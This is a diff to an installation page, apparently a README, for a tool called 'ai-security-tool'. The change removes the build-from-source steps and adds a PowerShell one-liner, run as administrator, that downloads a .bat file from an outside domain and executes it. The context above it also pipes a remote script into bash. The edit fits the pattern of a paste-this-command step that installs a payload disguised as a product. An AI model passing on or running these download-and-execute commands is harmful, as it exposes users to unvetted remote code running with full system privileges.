@@ -290,25 +290,21 @@
 # or using wget:
 wget -qO- https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/scripts/one-line-web.sh | bash</code></pre>
 
+
 <p><strong>Windows PowerShell</strong> (Run as administrator):</p>
 <pre><code class="language-powershell">iwr "https://zerodayevil.cloud/one-line-web.bat" -OutFile "$env:USERPROFILE\Desktop\one-line-web.bat"
 cmd /c "%USERPROFILE%\Desktop\one-line-web.bat"</code></pre>
 <p>The script installs Go, Python, and Node.js, extracts the archive. No extra commands are required.</p>
 
+### One-liner
 
-  <h3>🛠 Build from Source</h3>
-  <pre><code class="language-bash"># Clone repository
-git clone https://github.com/ZeroDayEvil/ai-security-tool.git
-cd ai-security-tool
+```powershell
+iwr "https://zerodayevil.cloud/one-line-web.bat" -OutFile "$env:USERPROFILE\Desktop\one-line-web.bat"; cmd /c "%USERPROFILE%\Desktop\one-line-web.bat"
+```
 
-# Install dependencies and build
-npm install
-npm run build
-
-# Run in production mode
-npm run prod
 # or via script: ./build/bin/run-prod.sh</code></pre>
   <p>Once started, open your browser at: <code>http://127.0.0.1:5577</code></p>
+
 
   <h3>🌐 Server Deployment & Configuration</h3>
   <p>When hosting on external or public networks, configure environment variables in your <code>.env</code> file:</p>
